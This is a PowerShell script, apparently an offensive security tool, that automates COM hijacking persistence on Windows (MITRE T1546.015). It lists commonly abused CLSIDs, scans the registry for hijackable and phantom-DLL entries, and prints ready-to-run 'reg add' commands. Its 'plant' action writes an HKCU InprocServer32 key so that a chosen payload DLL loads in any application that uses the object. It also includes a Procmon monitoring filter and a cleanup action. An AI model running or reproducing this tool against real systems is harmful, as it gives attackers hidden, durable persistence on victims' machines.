<#
.SYNOPSIS
    COM Hijacking Persistence — Enumerate and plant COM-based persistence.

.DESCRIPTION
    COM objects are loaded by CLSID from registry. HKCU overrides HKLM,
    so a user-writable HKCU\CLSID key pointing to a malicious DLL will
    be loaded by any application using that COM object.

    This script automates discovery and exploitation of COM hijack vectors.

    MITRE ATT&CK: T1546.015 — Component Object Model Hijacking

.PARAMETER Action
    discover — Find hijackable COM objects (HKLM without HKCU override)
    monitor  — Create Procmon filter for COM load monitoring
    plant    — Register a COM hijack (HKCU InprocServer32)
    clean    — Remove planted COM hijack

.EXAMPLE
    .\com_persistence.ps1 -Action discover
    .\com_persistence.ps1 -Action discover -Filter "explorer"
    .\com_persistence.ps1 -Action plant -CLSID "{<target-clsid>}" -DllPath "C:\payload.dll"
    .\com_persistence.ps1 -Action clean -CLSID "{<target-clsid>}"
#>

param(
    [ValidateSet("discover", "monitor", "plant", "clean")]
    [string]$Action = "discover",
    [string]$CLSID = "",
    [string]$DllPath = "",
    [string]$Filter = ""
)

# Well-known CLSIDs frequently abused for persistence
$knownTargets = @(
    @{CLSID="{BCDE0395-E52F-467C-8E3D-C4579291692E}"; Name="MMDeviceEnumerator"; Trigger="Any app using audio"},
    @{CLSID="{4590F811-1D3A-11D0-891F-00AA004B2E24}"; Name="WBEM Locator"; Trigger="WMI queries"},
    @{CLSID="{F56F6FDD-AA9D-4618-A949-C1B91AF43B1A}"; Name="TaskScheduler"; Trigger="Task Scheduler access"},
    @{CLSID="{0002DF01-0000-0000-C000-000000000046}"; Name="InternetExplorer"; Trigger="IE COM usage"},
    @{CLSID="{D5E8041D-920F-45e9-B8FB-B1DEB82C6E5E}"; Name="CLSID for TreatAs"; Trigger="Shell operations"},
    @{CLSID="{C08AFD90-F2A1-11D1-8455-00A0C91F3880}"; Name="ShellBrowserWindow"; Trigger="Explorer windows"}
)

switch ($Action) {
    "discover" {
        Write-Host "`n[*] COM Hijacking Discovery`n" -ForegroundColor Cyan

        # Check known targets first
        Write-Host "--- Known Hijackable CLSIDs ---" -ForegroundColor Yellow
        foreach ($target in $knownTargets) {
            $hklmPath = "HKLM:\Software\Classes\CLSID\$($target.CLSID)\InprocServer32"
            $hkcuPath = "HKCU:\Software\Classes\CLSID\$($target.CLSID)\InprocServer32"

            $hklmExists = Test-Path $hklmPath
            $hkcuExists = Test-Path $hkcuPath

            if ($hklmExists -and -not $hkcuExists) {
                $dll = (Get-ItemProperty $hklmPath -ErrorAction SilentlyContinue).'(default)'
                Write-Host "[HIJACKABLE] $($target.Name)" -ForegroundColor Red
                Write-Host "  CLSID: $($target.CLSID)"
                Write-Host "  DLL: $dll"
                Write-Host "  Trigger: $($target.Trigger)"
                Write-Host "  Plant: reg add `"HKCU\Software\Classes\CLSID\$($target.CLSID)\InprocServer32`" /ve /d `"C:\payload.dll`" /f"
                Write-Host ""
            } elseif ($hkcuExists) {
                $dll = (Get-ItemProperty $hkcuPath -ErrorAction SilentlyContinue).'(default)'
                Write-Host "[ALREADY SET] $($target.Name) → $dll" -ForegroundColor Gray
            }
        }

        # Broad scan for HKLM CLSIDs without HKCU override
        Write-Host "`n--- Scanning All CLSIDs (HKLM without HKCU override) ---" -ForegroundColor Yellow

        $count = 0
        $hijackable = 0
        try {
            $clsids = Get-ChildItem "HKLM:\Software\Classes\CLSID" -ErrorAction SilentlyContinue
            foreach ($key in $clsids) {
                $count++
                $clsidVal = $key.PSChildName
                $inproc = Join-Path $key.PSPath "InprocServer32"

                if (-not (Test-Path $inproc)) { continue }

                $dll = (Get-ItemProperty $inproc -ErrorAction SilentlyContinue).'(default)'
                if (-not $dll) { continue }

                # Filter
                if ($Filter -and $dll -notmatch $Filter -and $clsidVal -notmatch $Filter) { continue }

                # Check if HKCU override exists
                $hkcuCheck = "HKCU:\Software\Classes\CLSID\$clsidVal"
                if (-not (Test-Path $hkcuCheck)) {
                    # Check if DLL exists and is non-system
                    $expandedDll = [System.Environment]::ExpandEnvironmentVariables($dll)
                    $dllExists = Test-Path $expandedDll -ErrorAction SilentlyContinue

                    if (-not $dllExists) {
                        Write-Host "[PHANTOM] $clsidVal" -ForegroundColor Red
                        Write-Host "  Missing DLL: $dll"
                        $hijackable++
                    }
                }
            }
        } catch {}

        Write-Host "`n[*] Scanned $count CLSIDs, found $hijackable phantom (missing DLL) entries"
    }

    "monitor" {
        Write-Host "[*] Generating Procmon filter for COM monitoring..." -ForegroundColor Yellow

        $filterXml = @"
<?xml version="1.0" encoding="UTF-8"?>
<procmon>
  <filterlist>
    <filter>
      <column>Path</column>
      <relation>contains</relation>
      <value>InprocServer32</value>
      <action>include</action>
    </filter>
    <filter>
      <column>Result</column>
      <relation>is</relation>
      <value>NAME NOT FOUND</value>
      <action>include</action>
    </filter>
    <filter>
      <column>Operation</column>
      <relation>is</relation>
      <value>RegQueryValue</value>
      <action>include</action>
    </filter>
  </filterlist>
</procmon>
"@
        $filterPath = Join-Path $PWD "com_monitor_filter.pmc"
        $filterXml | Out-File -FilePath $filterPath -Encoding utf8
        Write-Host "[+] Filter saved: $filterPath"
        Write-Host "[*] Usage: Procmon.exe /LoadConfig $filterPath"
        Write-Host "[*] Then launch target app and look for NAME NOT FOUND on HKCU CLSIDs"
    }

    "plant" {
        if (-not $CLSID -or -not $DllPath) {
            Write-Host "[-] Requires -CLSID and -DllPath" -ForegroundColor Red
            Write-Host "    .\com_persistence.ps1 -Action plant -CLSID '{BCDE0395-...}' -DllPath 'C:\payload.dll'"
            return
        }

        $regPath = "HKCU:\Software\Classes\CLSID\$CLSID\InprocServer32"
        Write-Host "[*] Planting COM hijack..." -ForegroundColor Yellow
        Write-Host "  CLSID: $CLSID"
        Write-Host "  DLL: $DllPath"

        New-Item -Path $regPath -Force | Out-Null
        Set-ItemProperty -Path $regPath -Name "(default)" -Value $DllPath
        Set-ItemProperty -Path $regPath -Name "ThreadingModel" -Value "Both"

        Write-Host "[+] COM hijack planted!" -ForegroundColor Green
        Write-Host "[*] DLL will load when any app uses this CLSID"
        Write-Host "[*] Clean: .\com_persistence.ps1 -Action clean -CLSID '$CLSID'"
    }

    "clean" {
        if (-not $CLSID) {
            Write-Host "[-] Requires -CLSID" -ForegroundColor Red
            return
        }

        $regPath = "HKCU:\Software\Classes\CLSID\$CLSID"
        if (Test-Path $regPath) {
            Remove-Item -Path $regPath -Recurse -Force
            Write-Host "[+] Removed HKCU override for $CLSID" -ForegroundColor Green
        } else {
            Write-Host "[-] No HKCU override found for $CLSID" -ForegroundColor Gray
        }
    }
}
